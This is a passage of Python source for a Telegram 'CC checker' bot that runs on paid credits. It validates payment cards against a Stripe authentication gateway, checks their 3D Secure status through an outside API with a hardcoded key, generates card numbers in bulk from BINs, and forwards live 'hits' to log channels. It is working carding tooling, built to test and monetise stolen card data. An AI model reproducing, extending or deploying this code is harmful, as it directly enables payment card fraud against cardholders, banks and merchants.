• <code>/pmchk</code> - Upload File For Mass Check (Public)
• <code>/vbv</code> - Check Card Security
• <code>/daily</code> - Claim Daily Credits
• <code>/dailytop</code> - Check Daily Leaderboard
• <code>/credits</code> - Check Credits
• <code>/plans</code> - Check Plans
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands
"""

    # Add admin commands if user is admin
    if is_admin:
        welcome_text += """
<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/setcr user_id amount</code> - Set Credits
• <code>/setplan</code> - Set User Plan
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics
• <code>/admin</code> - List All Admin CMD
• <code>/testaccess</code> - Check Channel Access
• <code>/testenc</code> - Check Encrypt Code
• <code>/checkdb</code> - Check DB Health
• <code>/createdb</code> - Create DB Collection
• <code>/backupdb</code> - Backup DB Data
• <code>/resetall</code> - Reset Full DB
"""

    welcome_text += """
<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""

    await message.reply_text(
        welcome_text,
        parse_mode=ParseMode.HTML,
    )


async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command - Shows public bot info"""
    user_id = update.effective_user.id

    # Get user stats for display
    user = await get_user(user_id)
    is_admin = user_id in ADMIN_IDS

    # Prepare info message using HTML
    info_text = f"""<b>{BOT_INFO['name']}</b>
══════════════════════
<b>Version:</b> {BOT_INFO['version']}
<b>Creator:</b> @ISHANT_OFFICIAL
<b>Gates:</b> {BOT_INFO['gates']}

<b>Features:</b>
{BOT_INFO['features']}

<b>Your Stats:</b>
• Credits: <b>{user.get('credits', 0)}</b>
• Total Checks: <b>{user.get('total_checks', 0)}</b>
"""

    # Add admin commands if user is admin
    if is_admin:
        info_text += """
<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/setcr user_id amount</code> - Set Credits
• <code>/setplan</code> - Set User Plan
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics
• <code>/admin</code> - List All Admin CMD
• <code>/testaccess</code> - Check Channel Access
• <code>/testenc</code> - Check Encrypt Code
• <code>/checkdb</code> - Check DB Health
• <code>/createdb</code> - Create DB Collection
• <code>/backupdb</code> - Backup DB Data
• <code>/resetall</code> - Reset Full DB
"""

    info_text += """
<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        info_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
    )


async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /credits command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return

    user = await get_user(user_id)

    if not user["joined_channel"]:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Get referral stats
    referrals_count = user.get("referrals_count", 0)
    earned_from_referrals = user.get("earned_from_referrals", 0)

    keyboard = [
        [
            InlineKeyboardButton("🎁 Claim Gift Code", callback_data="claim_gift"),
            InlineKeyboardButton("🤝 Invite & Earn", callback_data="invite"),
        ],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await message.reply_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n"
        f"*Referrals:* {referrals_count} users (+{earned_from_referrals} credits earned)\n\n"
        f"*Get More Credits:*\n"
        f"1. Invite friends: +100 Credits Each\n"
        f"2. Claim Gift Codes\n"
        f"3. Ask Admin For Credits\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
    )


async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /invite command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return

    user = await get_user(user_id)

    if not user["joined_channel"]:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    keyboard = [
        [InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await message.reply_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How It Works:*\n"
        f"1. Share Your Invite Link With Friends\n"
        f"2. When They Join Using Your Link:\n"
        f"   • You Get 100 Credits\n"
        f"   • They Get 20 Credits\n"
        f"3. Earn Unlimited Credits!\n\n"
        f"*Your Stats:*\n"
        f"• Referrals: {user.get('referrals_count', 0)} Users\n"
        f"• Earned From Referrals: {user.get('earned_from_referrals', 0)} Credits\n\n"
        f"*Copy And Share Your Link Now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
    )


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PRIVATE single check - hits sent to PRIVATE_LOG_CHANNEL"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"

    if not user.get("joined_channel", False):
        await update.message.reply_text(
            "❌ Please join our private channel first using /start"
        )
        return

    if not context.args:
        await update.message.reply_text(
            "🔒 *PRIVATE SINGLE CHECK*\n"
            "══════════════════════\n"
            "*Usage:* `/chk cc|mm|yy|cvv`\n"
            "*Example:* `/chk 4111111111111111|12|25|123`\n\n"
            "*Credit Costs:*\n"
            "• ✅ Approved/🔥 Live: 3 credits\n"
            "• 🔢 CCN/💳 CVV: 2 credits\n"
            "• ❌ Declined: 1 credit\n\n",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    card_input = " ".join(context.args)
    parts = card_input.split("|")

    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
        return

    # Check card first to determine cost
    processing_msg = await update.message.reply_text(
        "[↯] Card: Processing...\n"
        "[↯] Status: Processing...\n"
        "[↯] Response: Processing...\n"
        "[↯] Gateway: Processing...\n"
        "- - - - - - - - - - - - - - - - - - - - - -\n"
        "[↯] Bank: Processing...\n"
        "[↯] Country: Processing...\n"
        "- - - - - - - - - - - - - - - - - - - - - -\n"
        "[↯] 𝐓𝐢𝐦𝐞: Processing...\n"
        "- - - - - - - - - - - - - - - - - - - - - -\n"
        "[↯] User : Processing...\n"
        "[↯] Made By: @ISHANT_OFFICIAL\n"
        "[↯] Bot: @DARKXCODE_STRIPE_BOT"
    )

    start_time = time.time()
    result_card, status, message, http_code = await check_single_card_fast(card_input)
    actual_time = time.time() - start_time

    # Get credit cost - CORRECTED INDENTATION
    credit_cost = get_credit_cost(status)

    # Check if user has enough credits (only for paid cards) - CORRECTED INDENTATION
    if credit_cost > 0 and user.get("credits", 0) < credit_cost:
        await processing_msg.edit_text(
            f"💰 Insufficient Credits\n"
            f"Status: {status.upper()}\n"
            f"Cost: {credit_cost} credits\n"
            f"Your balance: {user['credits']} credits\n\n"
            f"*Credit Costs:*\n"
            f"• ✅ Approved/🔥 Live: 3 credits\n"
            f"• ❌ All Declined Cards: FREE"
        )
        return

    # Update user statistics - CORRECTED INDENTATION
    updates = {
        "total_checks": user.get("total_checks", 0) + 1,
    }

    # Update specific counters
    status_field = f"{status}_cards"
    if status_field in [
        "approved_cards",
        "live_cards",
        "ccn_cards",
        "cvv_cards",
        "declined_cards",
        "risk_cards",
        "fraud_cards",
        "call_issuer_cards",
        "cannot_auth_cards",
        "processor_declined_cards",
    ]:
        updates[status_field] = user.get(status_field, 0) + 1

    # Only deduct credits for approved/live cards - CORRECTED INDENTATION
    if credit_cost > 0:
        updates["credits"] = user.get("credits", 0) - credit_cost
        updates["credits_spent"] = user.get("credits_spent", 0) + credit_cost
        updates["credits_used_today"] = user.get("credits_used_today", 0) + credit_cost

    await update_user(user_id, updates)

    # Update bot statistics - CORRECTED INDENTATION
    await update_bot_stats(
        {"total_checks": 1, "total_credits_used": credit_cost, f"total_{status}": 1}
    )

    # Format result - CORRECTED INDENTATION
    result_text = format_universal_result(
        card_data=result_card,
        status=status,
        message=message,
        gateway="Stripe Auth",
        username=username,
        time_taken=actual_time,
    )

    await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)

    # Save hit and forward to PRIVATE channel - CORRECTED INDENTATION
    if status in ["approved", "live"]:
        save_hit_card(user_id, card_input, status, is_private=True)
        await send_to_log_channel(
            context=context,
            card=card_input,
            status=status,
            message=message,
            username=username,
            time_taken=actual_time,
            is_private=True,
        )
        logger.info(
            f"PRIVATE hit: User {user_id} ({username}) - {status.upper()}: {card_input} | Cost: {credit_cost} credits"
        )


async def pchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PUBLIC single check - hits sent to APPROVED_LOG_CHANNEL"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"

    if not user.get("joined_channel", False):
        await update.message.reply_text(
            "❌ Please join our private channel first using /start"
        )
        return

    if not context.args:
        await update.message.reply_text(
            "⚡ *PUBLIC SINGLE CHECK*\n"
            "══════════════════════\n"
            "*Usage:* `/pchk cc|mm|yy|cvv`\n"
            "*Example:* `/pchk 4111111111111111|12|25|123`\n\n"
            "*Credit Costs:*\n"
            "• ✅ Approved/🔥 Live: 3 credits\n"
            "• 🔢 CCN/💳 CVV: 2 credits\n"
            "• ❌ Declined: 1 credit\n\n",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    card_input = " ".join(context.args)
    parts = card_input.split("|")

    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use: cc|mm|yy|cvv")
        return

    # Check card first to determine cost
    processing_msg = await update.message.reply_text(
        "[↯] Card: Processing...\n"
        "[↯] Status: Processing...\n"
        "[↯] Response: Processing...\n"
        "[↯] Gateway: Processing...\n"
        "- - - - - - - - - - - - - - - - - - - - - -\n"
        "[↯] Bank: Processing...\n"
        "[↯] Country: Processing...\n"
        "- - - - - - - - - - - - - - - - - - - - - -\n"
        "[↯] 𝐓𝐢𝐦𝐞: Processing...\n"
        "- - - - - - - - - - - - - - - - - - - - - -\n"
        "[↯] User : Processing...\n"
        "[↯] Made By: @ISHANT_OFFICIAL\n"
        "[↯] Bot: @DARKXCODE_STRIPE_BOT"
    )

    start_time = time.time()
    result_card, status, message, http_code = await check_single_card_fast(card_input)
    actual_time = time.time() - start_time

    # CORRECTED INDENTATION FROM HERE:
    credit_cost = get_credit_cost(status)

    # Check if user has enough credits (only for paid cards)
    if credit_cost > 0 and user.get("credits", 0) < credit_cost:
        await processing_msg.edit_text(
            f"💰 Insufficient Credits\n"
            f"Status: {status.upper()}\n"
            f"Cost: {credit_cost} credits\n"
            f"Your balance: {user['credits']} credits\n\n"
            f"*Credit Costs:*\n"
            f"• ✅ Approved/🔥 Live: 3 credits\n"
            f"• ❌ All Declined Cards: FREE"
        )
        return

    # Update user statistics
    updates = {
        "total_checks": user.get("total_checks", 0) + 1,
    }

    # Update specific counters
    status_field = f"{status}_cards"
    if status_field in [
        "approved_cards",
        "live_cards",
        "ccn_cards",
        "cvv_cards",
        "declined_cards",
        "risk_cards",
        "fraud_cards",
        "call_issuer_cards",
        "cannot_auth_cards",
        "processor_declined_cards",
    ]:
        updates[status_field] = user.get(status_field, 0) + 1

    # Only deduct credits for approved/live cards
    if credit_cost > 0:
        updates["credits"] = user.get("credits", 0) - credit_cost
        updates["credits_spent"] = user.get("credits_spent", 0) + credit_cost
        updates["credits_used_today"] = user.get("credits_used_today", 0) + credit_cost

    await update_user(user_id, updates)

    # Update bot statistics
    await update_bot_stats(
        {"total_checks": 1, "total_credits_used": credit_cost, f"total_{status}": 1}
    )

    # Format result
    result_text = format_universal_result(
        card_data=result_card,
        status=status,
        message=message,
        gateway="Stripe Auth",
        username=username,
        time_taken=actual_time,
    )

    await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)

    # Save hit and forward to PUBLIC channel
    if status in ["approved", "live"]:
        save_hit_card(user_id, card_input, status, is_private=False)
        await send_to_log_channel(
            context=context,
            card=card_input,
            status=status,
            message=message,
            username=username,
            time_taken=actual_time,
            is_private=False,  # PUBLIC channel
        )
        logger.info(
            f"PUBLIC hit: User {user_id} ({username}) - {status.upper()}: {card_input} | Cost: {credit_cost} credits"
        )


async def vbv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if card requires OTP/3D Secure - FIXED VERSION"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"
    
    # Check daily reset
    await check_daily_reset(user_id)
    user = await get_user(user_id)  # Refresh user data
    
    # Check daily VBV limit
    if user["vbv_used_today"] >= user["daily_vbv_limit"]:
        response = f"""
<b>❌ Daily VBV Limit Reached</b>
══════════════════════
You've used <b>{user['vbv_used_today']}/{user['daily_vbv_limit']}</b> VBV checks today.

<b>Plan:</b> {user['plan'].upper()}
<b>Reset:</b> 00:00 UTC

<code>Upgrade plan for higher limits!</code>
══════════════════════
"""
        await update.message.reply_text(response, parse_mode=ParseMode.HTML)
        return
    
    if not context.args:
        help_text = f"""
<b>🔐 VBV/3D SECURE CHECK</b>
══════════════════════
<b>Usage:</b> <code>/vbv cc|mm|yy|cvv</code>
<b>Example:</b> <code>/vbv 5438178183075555|11|2027|661</code>

<b>Cost:</b> 5 credits per check
<b>Your Usage:</b> {user['vbv_used_today']}/{user['daily_vbv_limit']} today
══════════════════════
"""
        await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)
        return
    
    card_input = " ".join(context.args)
    
    # Parse card
    try:
        # Clean the card input
        card_input = card_input.strip()
        
        # Handle different formats
        if "|" in card_input:
            parts = card_input.split("|")
        elif " " in card_input:
            parts = card_input.split()
        elif "/" in card_input:
            parts = card_input.split("/")
        else:
            # Try to parse as raw string
            if len(card_input) >= 23 and card_input.replace(" ", "").isdigit():
                # Format: 16digits4digits3digits
                clean = card_input.replace(" ", "")
                cc = clean[:16]
                month = clean[16:18]
                year = clean[18:20]
                cvv = clean[20:23]
                parts = [cc, month, year, cvv]
            else:
                await update.message.reply_text(
                    "<b>❌ Invalid Format</b>\n"
                    "Use: <code>cc|mm|yy|cvv</code>\n"
                    "Example: <code>/vbv 5438178183075555|11|27|661</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
        
        if len(parts) < 4:
            await update.message.reply_text(
                "<b>❌ Invalid Format</b>\n"
                "Use: <code>cc|mm|yy|cvv</code>\n"
                "Example: <code>/vbv 5438178183075555|11|27|661</code>",
                parse_mode=ParseMode.HTML,
            )
            return
        
        cc, mon, year, cvv = parts[:4]
        cc_clean = cc.replace(" ", "")
        
        # Validate card number
        if len(cc_clean) < 13 or len(cc_clean) > 19:
            await update.message.reply_text(
                "<b>❌ Invalid Card Number</b>\n"
                "Card number should be 13-19 digits",
                parse_mode=ParseMode.HTML,
            )
            return
        
        # Validate month
        if not mon.isdigit() or int(mon) < 1 or int(mon) > 12:
            await update.message.reply_text(
                "<b>❌ Invalid Month</b>\n"
                "Month should be 01-12",
                parse_mode=ParseMode.HTML,
            )
            return
        
        # Validate year
        if not year.isdigit():
            await update.message.reply_text(
                "<b>❌ Invalid Year</b>\n"
                "Year should be 2 or 4 digits",
                parse_mode=ParseMode.HTML,
            )
            return
        
        # Validate CVV
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            await update.message.reply_text(
                "<b>❌ Invalid CVV</b>\n"
                "CVV should be 3-4 digits",
                parse_mode=ParseMode.HTML,
            )
            return
        
        # Format card for API (PLAIN TEXT, not encrypted)
        mon_formatted = mon.zfill(2)
        if len(year) == 4:
            year_formatted = year[2:]
        else:
            year_formatted = year.zfill(2)
        
        formatted_card = f"{cc_clean}|{mon_formatted}|{year_formatted}|{cvv}"
        
    except Exception as e:
        logger.error(f"Card parsing error: {e}")
        await update.message.reply_text(
            f"<b>❌ Card Parsing Error</b>\n"
            f"Error: {str(e)[:50]}\n\n"
            f"Format: <code>cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    
    # Check credits (VBV always costs 5)
    if user["credits"] < 5:
        response = f"""
<b>💰 Insufficient Credits</b>
══════════════════════
<b>VBV Check Cost:</b> 5 credits
<b>Your Balance:</b> {user['credits']} credits

<code>Add credits to continue!</code>
══════════════════════
"""
        await update.message.reply_text(response, parse_mode=ParseMode.HTML)
        return
    
    processing_msg = await update.message.reply_text(
        "<b>🔍 Checking 3D Secure Status...</b>",
        parse_mode=ParseMode.HTML,
    )
    
    try:
        # Call VBV API
        start_time = time.time()
        api_result = await check_vbv_api(formatted_card)
        time_taken = time.time() - start_time
        
        # Deduct credits (only if API call was attempted)
        updates = {
            "credits": user["credits"] - 5,
            "credits_spent": user.get("credits_spent", 0) + 5,
            "credits_used_today": user.get("credits_used_today", 0) + 5,
            "vbv_used_today": user["vbv_used_today"] + 1,
            "total_vbv_checks": user.get("total_vbv_checks", 0) + 1,
        }
        await update_user(user_id, updates)
        
        # Format result
        result_text = format_vbv_result_html(
            formatted_card, api_result, username, time_taken
        )
        await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        
        # Update bot statistics
        await update_bot_stats({"total_vbv_checks": 1, "total_credits_used": 5})
        
        logger.info(f"VBV check completed for user {user_id}: {api_result.get('status', 'unknown')}")
        
    except Exception as e:
        logger.error(f"VBV check error: {e}")
        error_text = f"""
<b>❌ VBV Check Failed</b>
══════════════════════
<b>Card:</b> <code>{formatted_card}</code>
<b>Error:</b> {str(e)[:100]}

<code>Please try again with a valid card.</code>
══════════════════════
"""
        await processing_msg.edit_text(error_text, parse_mode=ParseMode.HTML)


async def check_vbv_api(card_data):
    """Check VBV status using VoidAPI v2 with correct format and API key"""
    try:
        api_key = "VDX-SHA2X-NZ0RS-O7HAM"
        
        # Ensure card is in plain format (decrypt if encrypted)
        if card_data.startswith("DXC_"):
            # Decrypt if it's our encrypted format
            card_data = decrypt_card_data(card_data)
        elif "|" not in card_data:
            # Try to parse as raw format
            parts = card_data.split()
            if len(parts) >= 4:
                card_data = f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"
        
        # Parse card components to ensure clean format
        if "|" in card_data:
            parts = card_data.split("|")
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[:4]
                # Clean card number (remove spaces)
                cc_clean = cc.replace(" ", "")
                # Format year (2 digits)
                if len(yy) == 4:
                    yy = yy[2:]
                # Format month (2 digits)
                if len(mm) == 1:
                    mm = f"0{mm}"
                
                card_data = f"{cc_clean}|{mm}|{yy}|{cvv}"
        
        # URL encode the card data
        encoded_card = urllib.parse.quote(card_data)
        url = f"https://api.voidapi.xyz/v2/vbv?key={api_key}&card={encoded_card}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "accept": "application/json"
        }
        
        logger.info(f"Calling VBV API: {url[:100]}...")
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=15) as response:
                if response.status == 200:
                    data = await response.json()
                    
                    # Debug: Log the full response
                    logger.info(f"VBV API Response Status: {data.get('success', 'N/A')}")
                    
                    # Extract data from response
                    if data.get("success", False):
                        response_data = data.get("data", {})
                        
                        return {
                            "success": True,
                            "status": response_data.get("status", "unknown"),
                            "response": response_data.get("status", "No response"),
                            "bin": response_data.get("bin", ""),
                            "scheme": response_data.get("scheme", ""),
                            "bank": response_data.get("bank", ""),
                            "country": response_data.get("country", ""),
                            "emoji": response_data.get("emoji", "🏳️"),
                            "type": response_data.get("type", ""),
                            "level": response_data.get("level", ""),
                            "raw": data
                        }
                    else:
                        return {
                            "success": False,
                            "error": "API returned success=false",
                            "status": "api_error",
                            "response": ""
                        }
                else:
                    error_text = await response.text()
                    logger.error(f"VBV API HTTP Error {response.status}: {error_text[:200]}")
                    return {
                        "success": False,
                        "error": f"API returned status {response.status}: {error_text[:100]}",
                        "status": f"http_error_{response.status}",
                        "response": ""
                    }
                    
    except asyncio.TimeoutError:
        logger.error("VBV API Timeout")
        return {
            "success": False,
            "error": "API timeout (15s)",
            "status": "timeout",
            "response": ""
        }
    except aiohttp.ClientError as e:
        logger.error(f"VBV API Network Error: {e}")
        return {
            "success": False,
            "error": f"Network error: {str(e)}",
            "status": "network_error",
            "response": ""
        }
    except Exception as e:
        logger.error(f"VBV API Error: {e}")
        return {
            "success": False,
            "error": f"API error: {str(e)}",
            "status": "error",
            "response": ""
        }


def format_vbv_result_html(card, api_result, username, time_taken):
    """Format VBV check result in HTML with proper status detection"""
    cc, mon, year, cvv = card.split("|")
    
    # Check if API call was successful
    if not api_result.get("success", False):
        error_msg = api_result.get("error", "Unknown error")
        return f"""
<b>❌ VBV CHECK FAILED</b>
══════════════════════
<b>Card:</b> <code>{cc}|{mon}|{year}|{cvv}</code>
<b>Error:</b> {error_msg}
<b>Status:</b> {api_result.get('status', 'unknown')}

<code>API returned an error. Please try again later.</code>
══════════════════════
"""
    
    # Get response text and status
    response_text = api_result.get("response", "").lower()
    status = api_result.get("status", "unknown").lower()
    
    # Get BIN info from API response
    bin_info = {
        "bank": api_result.get("bank", "Unknown"),
        "country": api_result.get("country", "Unknown"),
        "country_flag": api_result.get("emoji", "🏳️"),
        "scheme": api_result.get("scheme", "Unknown"),
        "type": api_result.get("type", "Unknown"),
        "level": api_result.get("level", "Unknown")
    }
    
    # Define VBV passed statuses (from your list)
    vbv_passed_statuses = [
        "authenticate_successful",
        "authenticate_attempt_successful",
        "authenticate_passed",
        "authenticate_approved",
        "authenticate_verified"
    ]
    
    # Define error statuses
    error_statuses = [
        "lookup_card_error",
        "declined",
        "failed",
        "error",
        "invalid",
        "cannot",
        "rejected",
        "unsupported"
    ]
    
    # Define success statuses
    success_statuses = [
        "success",
        "passed",
        "approved",
        "verified"
    ]
    
    # Determine status based on response
    status_icon = "🔍"
    status_text = "❌ VBV FAILED"
    message = "Card not enrolled in 3D Secure"
    
    # Check for VBV passed status (specific to Braintree)
    for passed_status in vbv_passed_statuses:
        if passed_status in response_text or passed_status in status:
            status_icon = "✅"
            status_text = "VBV PASSED"
            message = f"3D Secure authenticated successfully ({passed_status})"
            break
    
    # Check for general success status
    for success_status in success_statuses:
        if success_status in response_text or success_status in status:
            if status_icon == "🔍":  # Only set if not already VBV PASSED
                status_icon = "✅"
                status_text = "SUCCESS"
                message = f"Card verification successful"
            break
    
    # Check for error status
    for error_status in error_statuses:
        if error_status in response_text or error_status in status:
            status_icon = "❌"
            if "lookup_card_error" in response_text or "lookup_card_error" in status:
                status_text = "CARD LOOKUP ERROR"
                message = "Unable to verify card details with issuer"
            elif "unsupported" in response_text or "unsupported" in status:
                status_text = "UNSUPPORTED"
                message = "Card issuer does not support 3D Secure"
            elif "cannot" in response_text or "cannot" in status:
                status_text = "CANNOT AUTHENTICATE"
                message = "Unable to authenticate card"
            else:
                status_text = "VBV FAILED"
                message = "3D Secure verification failed"
            break
    
    # Format response for display
    display_response = response_text.replace("_", " ").title()
    
    # Format card with masking
    masked_card = f"{cc[:6]}******{cc[-4:]}"
    
    return f"""
<b>🔐 VBV CHECK RESULT</b>
══════════════════════
<b>Card:</b> <code>{masked_card}|{mon}|{year}|{cvv}</code>
<b>Status:</b> {status_icon} {status_text}
<b>Message:</b> {message}
━━━━━━━━━━━━━━━━━━━━
<b>BIN Information:</b>
• <b>Bank:</b> {bin_info['bank']}
• <b>Country:</b> {bin_info['country']} {bin_info['country_flag']}
• <b>Scheme:</b> {bin_info['scheme']}
• <b>Type:</b> {bin_info['type']}
• <b>Level:</b> {bin_info['level']}
• <b>BIN:</b> {cc[:6]}**********
━━━━━━━━━━━━━━━━━━━━
<b>Cost:</b> 5 credits
<b>Time:</b> {time_taken:.2f}s
<b>User:</b> @{username}
━━━━━━━━━━━━━━━━━━━━
<b>Bot:</b> @DARKXCODE_STRIPE_BOT
══════════════════════
"""


async def check_vbv_api(card_data):
    """Check VBV status using API"""
    api_key = "VDX-SHA2X-NZ0RS-O7HAM"
    encoded_card = urllib.parse.quote(card_data)
    url = f"https://api.voidapi.xyz/v2/vbv?key={api_key}&card={encoded_card}"

    async with aiohttp.ClientSession() as session:
        async with session.get(url, timeout=10) as response:
            if response.status == 200:
                data = await response.json()
                return data
            else:
                raise Exception(f"API error: {response.status}")


async def generate_from_card_format(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    input_text: str,
    user_id: int,
    user: dict,
    username: str,
):
    """Generate cards from BIN|MM|YY or BIN|MM|YY|CVV format"""
    try:
        parts = input_text.split("|")

        if len(parts) < 3:
            await update.message.reply_text(
                "<b>❌ Invalid Format</b>\n"
                "Use: <code>/gen BIN|MM|YY</code> or <code>/gen BIN|MM|YY|CVV</code>\n"
                "Example: <code>/gen 411111|12|25</code>",
                parse_mode=ParseMode.HTML,
            )
            return

        # Parse parts
        bin_input = parts[0].strip()
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()

        # Parse CVV if provided
        cvv = None
        if len(parts) >= 4:
            cvv = parts[3].strip()

        # Validate inputs
        if not bin_input.isdigit() or len(bin_input) < 6:
            await update.message.reply_text(
                "<b>❌ Invalid BIN</b>\n" "BIN must be at least 6 digits",
                parse_mode=ParseMode.HTML,
            )
            return

        if not month.isdigit() or int(month) < 1 or int(month) > 12:
            await update.message.reply_text(
                "<b>❌ Invalid Month</b>\n" "Month must be 01-12",
                parse_mode=ParseMode.HTML,
            )
            return

        if not year.isdigit() or len(year) not in [2, 4]:
            await update.message.reply_text(
                "<b>❌ Invalid Year</b>\n" "Year must be 2 or 4 digits",
                parse_mode=ParseMode.HTML,
            )
            return

        if cvv and (not cvv.isdigit() or len(cvv) not in [3, 4]):
            await update.message.reply_text(
                "<b>❌ Invalid CVV</b>\n" "CVV must be 3-4 digits",
                parse_mode=ParseMode.HTML,
            )
            return

        # Default quantity
        quantity = 10

        # Check if quantity is specified after format
        if len(context.args) > 1:
            try:
                last_arg = context.args[-1]
                if "|" not in last_arg:  # Quantity is separate
                    quantity = int(last_arg)
            except:
                pass

        # Generate cards
        return await generate_and_send_cards(
            update,
            context,
            bin_input,
            quantity,
            user_id,
            user,
            username,
            fixed_month=month,
            fixed_year=year,
            fixed_cvv=cvv,
        )

    except Exception as e:
        logger.error(f"Card format generation error: {e}")
        await update.message.reply_text(
            f"<b>❌ Generation Error</b>\n{str(e)[:100]}", parse_mode=ParseMode.HTML
        )


def parse_card_input(card_input):
    """Parse card input with multiple format support"""
    try:
        # Remove extra spaces
        card_input = card_input.strip()

        # Try different separators
        separators = ["|", "/", " ", ";", ":"]

        for sep in separators:
            if sep in card_input:
                parts = card_input.split(sep)
                if len(parts) >= 4:
                    # Clean each part
                    cc = parts[0].replace(" ", "")
                    mon = parts[1].replace(" ", "")
                    year = parts[2].replace(" ", "")
                    cvv = parts[3].replace(" ", "")
                    return cc, mon, year, cvv

        # If no separator found, try to parse as continuous string
        if len(card_input) >= 23 and card_input.replace(" ", "").isdigit():
            clean = card_input.replace(" ", "")
            cc = clean[:16]
            year = clean[16:18]  # YY
            mon = clean[18:20]  # MM
            cvv = clean[20:23]  # CVV
            return cc, mon, year, cvv

        return None, None, None, None
    except Exception as e:
        logger.error(f"Error in parse_card_input: {e}")
        return None, None, None, None


async def generate_from_bin_format(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    input_text: str,
    user_id: int,
    user: dict,
    username: str,
):
    """Generate cards from BIN [quantity] format"""
    try:
        args = input_text.split()
        bin_input = args[0].strip()

        # Validate BIN
        bin_clean = "".join(filter(str.isdigit, bin_input))

        if len(bin_clean) < 6:
            await update.message.reply_text(
                "<b>❌ BIN Too Short</b>\n" "BIN should be at least 6 digits",
                parse_mode=ParseMode.HTML,
            )
            return

        # Parse quantity
        quantity = 10  # Default
        if len(args) > 1:
            try:
                quantity = int(args[1])
                if quantity < 1:
                    quantity = 1
                elif quantity > 5000:  # Max per request
                    quantity = 5000
            except ValueError:
                # If not a number, it might be part of the BIN
                pass

        # Generate cards
        return await generate_and_send_cards(
            update, context, bin_clean, quantity, user_id, user, username
        )

    except Exception as e:
        logger.error(f"BIN format generation error: {e}")
        await update.message.reply_text(
            f"<b>❌ Generation Error</b>\n{str(e)[:100]}", parse_mode=ParseMode.HTML
        )


async def generate_and_send_cards(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    bin_input: str,
    quantity: int,
    user_id: int,
    user: dict,
    username: str,
    fixed_month=None,
    fixed_year=None,
    fixed_cvv=None,
):
    """Generate cards and send to user"""

    # Check daily limit
    if user["gen_used_today"] + quantity > user["daily_gen_limit"]:
        remaining = user["daily_gen_limit"] - user["gen_used_today"]
        response = f"""
<b>❌ Daily Generation Limit Reached</b>
══════════════════════
<b>Requested:</b> {quantity} cards
<b>Remaining Today:</b> {remaining} cards
<b>Daily Limit:</b> {user['daily_gen_limit']} cards

<code>Upgrade plan for higher limits!</code>
══════════════════════
"""
        await update.message.reply_text(response, parse_mode=ParseMode.HTML)
        return

    # Start processing (ALWAYS FREE - NO CREDIT CHECK)
    processing_text = f"""
